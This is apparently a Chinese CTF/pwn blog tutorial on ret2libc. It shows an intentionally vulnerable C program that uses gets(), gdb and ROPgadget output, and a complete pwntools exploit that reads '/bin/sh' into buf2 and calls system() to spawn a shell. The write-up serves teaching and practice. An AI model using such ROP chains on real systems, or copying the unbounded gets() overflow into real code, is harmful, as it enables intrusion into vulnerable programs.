---
title: ret2libc攻击技术示例-仅有system()情况下输入"/bin/sh"完成函数调用
time: 2017-08-03
tags: [CTF, pwn, stackoverflow]
layout: post
categories: posts
---

# 情景描述

当程序中并没有直接的`"/bin/sh"`字符串时，我们该如何通过ret2libc技术实现`system("/bin/sh")`的执行呢？这时我们就需要借助`gets` `read`之类的函数，读入我们输入的`"/bin/sh"`到缓冲区后，然后依照ret2libc1的套路一样，将`"/bin/sh"`的地址，也就是缓冲区的地址，模拟传入实现函数调用

# 示例代码

``` c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

char buf2[100];

void secure(void)
{
    int secretcode, input;
    srand(time(NULL));

    secretcode = rand();
    scanf("%d", &input);
    if(input == secretcode)
        system("no_shell_QQ");
}

int main(void)
{
    setvbuf(stdout, 0LL, 2, 0LL);
    setvbuf(stdin, 0LL, 1, 0LL);

    char buf1[100];

    printf("Something surprise here, but I don't think it will work.\n");
    printf("What do you think ?");
    gets(buf1);

    return 0;
}
```

本节示例的漏洞程序可以在此处下载： [ret2libc2](/files/ret2libc2)

程序依旧只开启了NX保护
``` bash
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

# 漏洞分析

利用`gets()`函数，我们可以将`"/bin/sh"`写入到buf2中(buf1也可以)，但是这时需要注意，我们要合理设置`gets()`函数执行完后的返回地址，我们要保证函数执行完后依旧返回到rop链的下部分继续执行，因此我们需要一个gadget作为`gets()`返回地址。

这样，当`gets()`读取"/bin/sh"写入到buf中后，将返回到一个gadget上，gadget继续ret可以返回到下一部分，而这部分我们构造为`system("/bin/sh")`，那么这样的rop chain构造合理，我们就可以成功获取一个shell

``` bash
➜  ret2libc2 objdump -dj .plt ret2libc2 | grep -E "gets|system"
08048460 <gets@plt>:
08048490 <system@plt>:
➜  ret2libc2 ROPgadget --binary ret2libc2 --only 'pop|ret'
Gadgets information
============================================================
......
0x0804843d : pop ebx ; ret
......

Unique gadgets found: 7
➜  ret2libc2 readelf -s ret2libc2 | grep buf2
    59: 0804a080   100 OBJECT  GLOBAL DEFAULT   25 buf2
```

# 攻击代码

``` python
from pwn import *

pop_ebp_ret = 0x0804843d
plt_gets = 0x08048460
plt_system = 0x08048490
buf2 = 0x0804a080

payload = 'A' * 112
payload += p32(plt_gets) + p32(pop_ebp_ret) + p32(buf2)
payload += p32(plt_system) + p32(0xdeadbeef) + p32(buf2)

io = process('ret2libc2')
io.sendline(payload)
io.sendline("/bin/sh")
io.interactive()
```
